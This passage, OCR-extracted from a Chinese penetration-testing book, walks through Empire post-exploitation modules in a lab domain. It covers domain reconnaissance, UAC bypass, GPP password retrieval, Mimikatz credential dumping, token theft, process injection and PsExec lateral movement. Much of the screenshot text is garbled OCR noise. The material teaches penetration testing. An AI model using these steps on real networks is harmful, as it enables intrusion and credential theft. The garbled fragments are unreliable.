同样地，Empire也内置了端口扫描模块situational_awarenes/network/portscan，这
里就不演示了。
7.DNS信息获取
在内网中，知道所有机器的HostName和对应的IP地址对分析内网结构至关重要，
输入usemodule situational_awareness/network/reverse_dns命令即可使用该模块，这里
要设置Range参数，输入要扫描的IP网段并运行，如图6-121所示。
Dobstarted：u35c7
图6-121运行结果
如果该主机同时有两个网卡，Empire也会显示出来，方便我们寻找边界主机。
其实还可以利用另一个模块situational_awareness/host/dnsserver显示当前内网
DNS服务器的IP地址，如图6-122所示。
(Empire:64)>usenodule situational_awareness/host/dnsserver
mpire:
bell/sit
192.168.1.250
Enpire:
54）
(Enpire:64)>
图6-122显示当前内网DNS服务菱的IP地址
8.查找域管登录服务器IP
在内网涉透中，要想拿到内网中某台机器的域管权限，方法之一就是找到域管
登录的机器，然后横向渗透进去，窃取域管权限，从而拿下整个域，这个模块就是
用来查找域管登录的机器的。
使用usemodule situational_awareness/network/powerview/user_hunteri这个模块可
---
## Page 337
318Web安全政防：渗透测试实战指南
以清楚地看到哪位用户登录了哪台主机，这里显示域管曾经登录过机器名为
WIN7-64.shutcer.testlab，IP地址为192.168.31.251的这台机器，如图6-123所示。
Job started:Debug32m2v3
SerDosain
SHUTEER
192.168.31.251
NIN7-44.rator
.testlab
图6-123显示域管曾经登录过的机器
9.本地管理组访问模块
使用usemodule situational_awareness/network/powerview/find_localadmin_access
模块时，不需要做多余的设置，直接输入execute即可，结果如图6-124所示。
execste
WN7-66s.hter.tetab
Find-LocaLAdninAccess conpteted!
图6-124查看本地管理组访问结果
可以看到有两台计算机，名字分别为WIN7-64.shuteertestlab和WIN7-X86.shuteer
testlab,
10.获取控制器
现在可用lusemodule situational_awarenes/network/powerview/get_domain_controller
模块来确定当前的域控制器，因为已经有了域用户权限，直接输入execute即可，如
图6-125所示。
---
## Page 338
第6章PowerShell攻击指南319
gaain controlle
Enpire:situationat
ontreller)
CurrentTine
rest
syerston
oles
Phals
ltetness
Partition
DC.shuteer.testla
图6-125获取域控制器
从图6-125中可以看到当前域服务器名为DC，
再验证下能否访问域服务器DC的“CS”，结果同样顺利访问，如图6-126所示。
Enpire:
>shell dirDCics
1011日
LastWriteTine
Length Nane
2017/6/5
2813/B/22
23:52
2017/6/5
2817/6/5
22:26
2017/6/5
22:45
22:53
2017/5/11
2017/7/8
21:25
19:58
图6-126访问域服务器计算机
6.3.7权限提升
提权，顾名思义就是提高自己在服务器中的权限，就比如在Windows中，你本身
登录的用户是Guest，通过提权后就变成超级管理员，拥有了管理Windows的所有权
限。提权是黑客的专业名词，一般用于网站入侵和系统入侵，提权的方式有下面这
几种。
---
## Page 339
320Web安全攻防：渗透测试实战指南
1.Bypass UAC
输入usemodule privesc/bypassuac，设置Listener参数，运行execute，然后会发现
上线了一个新的反弹，如图6-127所示。
Job started:NPAVY
[+]Initial
agent ZEX4T8CH fron 218.
.145now active‘(Slack)
图6-127Bypass反弹成功
回到agents，输入list命令，可以看到多了一个agents，带星号的即为提权成功的
agents，如图6-128所示。
1usemoduleprivesc/powerup/
find_dtthijack
ll
图6-130查看模块列表
（1）AllIChecks模块
查找系统中的漏洞，和PowerSploit下PowerUp中的Invoke-AlIChecks模块一样，
该模块可以执行所有脚本检查系统漏洞，输入以下命令，如图6-131所示。
usemodule privesc/powerup/al1checks
execute
rotpt
[eesei-
Peti
ice.sae
sFiles Cds/VSin
[Oe
[Oeckirservicaraissir
图6-131检查系统漏洞
从图6-131中能看到列出了很多方法，可以尝试用BypassUAC来提权，提权前先
查看当前的agents，发现只有一个Name为CD3FRRYCFVTYXN3S，IP为192.
168.31.251的普通权限客户端，如图6-132所示。
---
## Page 341
322Web安全攻防：渗造测试实战指南
[°1Active agents:
ane
Last See
192.186.31.251 V07-44
/
围6-132查看当前的agents
接着输入bypassuactest命令来提权，等待几秒钟，就会返回一个更高权限的Shell，
如图6-133所示。
152125
Enpire:Co
[+]Initial agent 341CNFUFK3PKUML fron 192.168.31.251now active
图6-133提权成功
再次查看当前agents，可以看到多了一个Name为341CNFUFK3PKUDML的高权
限（带星号）客户端，如图6-134所示，说明提权成功。
l IP
alay
Last Sen
/
10
图6-134再次查看agents列表
（2）模块使用说明
AllChecks模块的应用对象如下所示。
任何没有引号的服务路径。
任何ACL配置错误的服务（可通过service_*利用）。
服务可执行文件上的任何设置不当的权限（可通过service_exe_*进行利用）。
任何剩余的unattend.xml文件。
设置AlwayslnstallElevated注册表项。
如果有任何Autologon凭证留在注册表中。
任何加密的web.config字符串和应用程序池密码。
对于任何%PATH%.DLL的助持机会（可通过write_dIlhijacker利用）。
具体使用方法可参见笔者的几篇文章，如下所示。
Metasploit、PowerShell之Windows错误系统配置漏洞实战提权（http:/www.
---
## Page 342
第6章PowerShell攻去指南4323
freebuf.com/articles/system/131388.html)
Metasploit 之Windows Services 漏润提权实战（http://www.4hou.com/
technology/ 4180.html)
Metasploit、Powershell之AlwaysInstallElevated提权实战(https://xianzhi.aliyun
com /forum /topic/203 )
4.GPP
在域里常会启用组策略首选项来更改本地密码，便于管理和部署映像，其缺点
是任何普通域用户都可以从相关域控制器的SYSVOL中读取部署信息，GPP是采用
AES256加密的，输入usemoduleprivesc/gpp命令就可以查看了，如图6-135所示。
odune
Get-cppeatsrves/pp
Folee
OpsecSafe:
Version:
OutputExtension:
Tone
thersur
nation for
ents:
Dotions:
Nane
RequLred
RE68G5K9
Vatue
Apint True
Description
Job started:NCV7FT
et-GPPPas
ord corpleted
trpire:
图6-135查看GPP
---
## Page 343
324Web安全政防：渗透测试实战指南
6.3.8
横向渗透
1.令牌窃取
我们在获取服务器权限后，可以使用内置的Mimikatz获取系统密码，执行完毕后
输入creds命令即可查看Empire列举的密码，如图6-136所示。
Host
test
VES7-4
N7-44
IN7-64
NIN7-13
图6-136列举出的密码
从图3-136中可以发现有域用户曾在此服务器上登录，此时可以窃取域用户身份，
然后进行横向移动，首先要窃取身份，使用pth命令，这里的ID号就是creds下的
CredID号，这里窃取Administrator的身份令牌，执行pth7命令，如图6-137所示。
图6-137窃取身份令牌
从图6-137中可以看到PID进程号为1380，使用steal_tokenPID命令即可窃取该身
---
## Page 344
第6章PowerShel攻击指南4325
份令牌，如图6-138所示。
nistrate
图6-138获得域用户令牌
同样可以输入ps命令查看是否有域用户的进程，如图6-139所示。
Syate
chost
289 54
56.20
SY 5.21 NB
图6-139查看当前进程
从图6-139中可以看到存在域用户的进程，这里选用同一个Name为CMD，PID为
1380的进程，如图6-140所示。
cmd
1388X64
trator
RVAdnin1s 2.66 H8
图6-140查看PID
同样通过stcal_tokcn命令来窃取这个令牌，这里先尝试访问域内另一台主机
WIN7-X86的“CS"，结果顺利访问，如图6-141所示。
图6-141成功窃取令牌
---
## Page 345
326Web安金政防：渗造测试实战指南
输入revtoself命令可以将令牌权限恢复到原来的状态，如图6-142所示。
[Empire:LR3SFCTAENFR
Enpire:
P]> revtoselt
evertToSelf
图6-142恢复令牌权限
2.会话注入
其实也可以使用usemodulemanagement/psinject模块进行进程注入，获取权限。
接着设置Listener和ProcID这两个参数，这里的ProcID还是之前CMD的1380，运行后
反弹回一个域用户权限Shell，如图6-143所示。
/ptwtrc
192.169.310.64
coueratelL/578
2817-07-0909:34
图6-143反弹成功
3.Invoke-PsExec
PsExec是笔者在Metasploit下经常使用的模块，PsTools工具包中也有PsExec，该
工具的缺点是能被基本的杀毒软件检测到并留下日志，而且需要开启adminS445端口
共享，其优点是可以直接返回SYSTEM权限。这里要演示的是Empire下的
Invoke-PsExec模块。
使用该模块的前提是已经获得本地管理员权限，甚至域管理员账户，然后以此
进一步持续渗透整个内网。
测试该模块前查看当前agents，发现只有一个IP为192.168.31.251，机器名为
WIN7-64的服务器，如图6-144所示。
---
## Page 346
第6章PowerShell攻击指南327
ers]>agents
Prscess
DelayLast Seet
KZXCS192.168.31.251VIN7-64
*sHUTtBmAdninistratpevershel1/1268
5/60291787-99：51：44
图6-144查看agents
现在使用usemodulelateral_movement/invoke_psexec模块渗透域内另一台机器
WIN7-X86，输入info查看设置参数，如图6-145所示。
ile:
False